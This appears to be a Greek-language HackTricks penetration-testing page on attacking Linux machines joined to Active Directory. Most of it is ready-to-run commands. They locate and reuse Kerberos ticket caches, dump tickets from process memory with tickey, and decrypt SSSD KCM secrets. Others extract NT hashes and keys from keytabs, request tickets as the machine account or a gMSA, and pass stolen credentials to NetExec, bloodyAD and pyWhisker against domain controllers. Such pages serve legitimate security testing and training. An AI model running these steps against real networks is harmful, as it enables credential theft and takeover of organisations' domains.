# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Ένα μηχάνημα linux μπορεί επίσης να βρίσκεται μέσα σε ένα περιβάλλον Active Directory.

Ένα μηχάνημα Linux μέσα σε ένα AD μπορεί να **αποθηκεύει Kerberos material τοπικά**: user ccaches, machine/service keytabs, και SSSD-managed secrets. Αυτά τα artefacts συνήθως μπορούν να επαναχρησιμοποιηθούν όπως οποιοδήποτε άλλο Kerberos credential. Για να διαβάσεις τα περισσότερα από αυτά θα χρειαστεί να είσαι ο χρήστης-owner του ticket ή να έχεις **root** στο μηχάνημα.

## Enumeration

### AD enumeration from linux

Αν έχεις πρόσβαση σε ένα AD σε linux (ή bash σε Windows) μπορείς να δοκιμάσεις [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) για να κάνεις enumerate το AD.

Μπορείς επίσης να ελέγξεις την ακόλουθη σελίδα για να μάθεις **άλλους τρόπους για να κάνεις enumerate το AD από linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

Το FreeIPA είναι ένα open-source **alternative** στο Microsoft Windows **Active Directory**, κυρίως για **Unix** περιβάλλοντα. Συνδυάζει έναν πλήρη **LDAP directory** με ένα MIT **Kerberos** Key Distribution Center για διαχείριση παρόμοια με το Active Directory. Χρησιμοποιώντας το Dogtag **Certificate System** για διαχείριση CA & RA certificate, υποστηρίζει **multi-factor** authentication, συμπεριλαμβανομένων smartcards. Το SSSD είναι ενσωματωμένο για διαδικασίες authentication στο Unix. Μάθε περισσότερα γι' αυτό στο:


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Πριν αγγίξεις tickets, αναγνώρισε **πώς το host joined to AD** και **πού αποθηκεύεται πραγματικά το Kerberos material**. Σε σύγχρονα Linux hosts αυτό συνήθως χειρίζεται από `realmd` + `adcli` + `sssd`, όχι μόνο από flat files στο `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Αυτό σου λέει γρήγορα αν το host εμπιστεύεται το AD, αν το SSSD κάνει caching identities ή tickets, και αν τα **machine/service keytabs** ή τα **KCM secrets** είναι διαθέσιμα για abuse.

## Playing with tickets

### Pass The Ticket

Σε αυτή τη σελίδα θα βρεις διαφορετικά μέρη όπου θα μπορούσες να **βρεις kerberos tickets μέσα σε έναν linux host**, στην ακόλουθη σελίδα μπορείς να μάθεις πώς να μετατρέπεις αυτά τα CCache tickets formats σε Kirbi (τη μορφή που χρειάζεσαι να χρησιμοποιήσεις στα Windows) και επίσης πώς να εκτελέσεις ένα PTT attack:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Αν θέλεις τα **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, κ.λπ.), δες την ειδική σελίδα:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

Τα αρχεία CCACHE είναι binary formats για **αποθήκευση Kerberos credentials**. Το `FILE:/tmp/krb5cc_%{uid}` παραμένει συνηθισμένο, αλλά τα σύγχρονα Linux deployments χρησιμοποιούν επίσης `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, ή `KCM:%{uid}`. Έλεγξε το environment variable **`KRB5CCNAME`** και τη ρύθμιση `default_ccache_name` πριν υποθέσεις ότι τα tickets βρίσκονται στο `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Επαναχρησιμοποίηση CCACHE ticket από keyring

**Kerberos tickets που είναι αποθηκευμένα στη μνήμη μιας διεργασίας μπορούν να εξαχθούν**, ιδιαίτερα όταν η προστασία ptrace του μηχανήματος είναι απενεργοποιημένη (`/proc/sys/kernel/yama/ptrace_scope`). Ένα χρήσιμο εργαλείο για αυτόν τον σκοπό βρίσκεται στο [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), το οποίο διευκολύνει την εξαγωγή με injecting σε sessions και το dumping tickets στο `/tmp`.

Για να ρυθμίσετε και να χρησιμοποιήσετε αυτό το εργαλείο, ακολουθούν τα παρακάτω βήματα:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Αυτή η διαδικασία θα προσπαθήσει να κάνει inject σε διάφορα sessions, υποδεικνύοντας επιτυχία αποθηκεύοντας τα extracted tickets στο `/tmp` με σύμβαση ονοματοδοσίας `__krb_UID.ccache`.

### CCACHE ticket reuse from SSSD KCM

Το SSSD διατηρεί ένα αντίγραφο της βάσης δεδομένων στη διαδρομή `/var/lib/sss/secrets/secrets.ldb`. Το αντίστοιχο key αποθηκεύεται ως hidden file στη διαδρομή `/var/lib/sss/secrets/.secrets.mkey`. By default, το key είναι αναγνώσιμο μόνο αν έχεις **root** permissions.

Η κλήση του **`SSSDKCMExtractor`** με τις παραμέτρους --database και --key θα κάνει parse τη βάση δεδομένων και θα **decrypt the secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Το **credential cache Kerberos blob μπορεί να μετατραπεί σε ένα χρησιμοποιήσιμο Kerberos CCache** αρχείο που μπορεί να δοθεί σε Mimikatz/Rubeus.

### Γρήγορο keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Εξαγωγή λογαριασμών από /etc/krb5.keytab

Τα κλειδιά service account, απαραίτητα για services που λειτουργούν με δικαιώματα root, αποθηκεύονται με ασφάλεια σε αρχεία **`/etc/krb5.keytab`**. Αυτά τα κλειδιά, παρόμοια με passwords για services, απαιτούν αυστηρή εμπιστευτικότητα.

Για να επιθεωρήσεις το περιεχόμενο του αρχείου keytab, μπορεί να χρησιμοποιηθεί το **`klist`**. Στο Linux, το `klist -k -K -e` εμφανίζει τα principals, τους αριθμούς έκδοσης κλειδιού, τους τύπους κρυπτογράφησης και το ακατέργαστο υλικό του κλειδιού. Αν ο τύπος κλειδιού είναι **23 / RC4-HMAC**, η τιμή του κλειδιού είναι επίσης το **NT hash** αυτού του principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Για χρήστες Linux, το **`KeyTabExtract`** προσφέρει λειτουργικότητα για την εξαγωγή του RC4 HMAC hash, το οποίο μπορεί να αξιοποιηθεί για NTLM hash reuse. Σημειώστε ότι αυτό βοηθά μόνο όταν το keytab εξακολουθεί να περιέχει υλικό **etype 23 / RC4-HMAC**. Σε περιβάλλοντα μόνο με **AES** μπορεί να μην πάρετε ένα επαναχρησιμοποιήσιμο NT hash, αλλά μπορείτε ακόμα να κάνετε authenticate απευθείας με το keytab μέσω Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Στο macOS, το **`bifrost`** λειτουργεί ως εργαλείο για ανάλυση αρχείων keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Αξιοποιώντας τις εξαγόμενες πληροφορίες λογαριασμού και hash, μπορούν να δημιουργηθούν συνδέσεις με servers χρησιμοποιώντας εργαλεία όπως το **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Επαναχρησιμοποίηση του machine account από το `/etc/krb5.keytab`

Σε συστήματα που έχουν γίνει join με `realmd`/`adcli`/`sssd`, το `/etc/krb5.keytab` συνήθως περιέχει τον **computer account** και ένα ή περισσότερα **host/service principals**. Αν έχεις **root**, μην το κάνεις απλώς dump: χρησιμοποίησε ένα από τα principals που εμφανίζονται με `klist -k` για να ζητήσεις ένα TGT και να ενεργήσεις ως το ίδιο το Linux host.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν το ίδιο το **computer object** έχει delegated rights στο AD ή όταν ο host επιτρέπεται να ανακτήσει άλλα secrets όπως ένα **gMSA**.

### Επαναχρησιμοποίησε κλεμμένο Kerberos material με Linux-first AD tooling

Μόλις αποκτήσεις ένα έγκυρο `ccache` ή ένα usable keytab, μπορείς να ενεργήσεις απέναντι στο AD **απευθείας από Linux** χωρίς να μετατρέπεις πρώτα τα πάντα σε Windows formats. Πολλά σύγχρονα tools δέχονται `KRB5CCNAME` / Kerberos auth natively:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Αυτό αποτελεί μια καλή γέφυρα μεταξύ **Linux post-exploitation** και **AD object abuse**. Για τα ίδια τα object-level abuse paths, δες:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Recent Linux deployments μπορούν να χρησιμοποιούν **Managed Service Accounts** απευθείας από το AD. Στην πράξη αυτό σημαίνει ότι, αφού compromize ένα Linux server, μπορεί να βρεις όχι μόνο το host keytab αλλά και **service-specific keytabs** που δημιουργήθηκαν από ένα gMSA. Συνήθεις τοποθεσίες για έλεγχο είναι τα `/etc/gmsad.conf`, deployment-specific config files, και επιπλέον `*.keytab` files κάτω από το `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Αυτό σου δίνει μια επαναχρησιμοποιήσιμη Kerberos identity για τα SPNs που είναι δεμένα σε αυτό το gMSA **χωρίς να αγγίξεις κανέναν Windows endpoint**. Για **domain-side** gMSA/dMSA abuse μετά από υψηλότερα privileges στο AD, δες:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
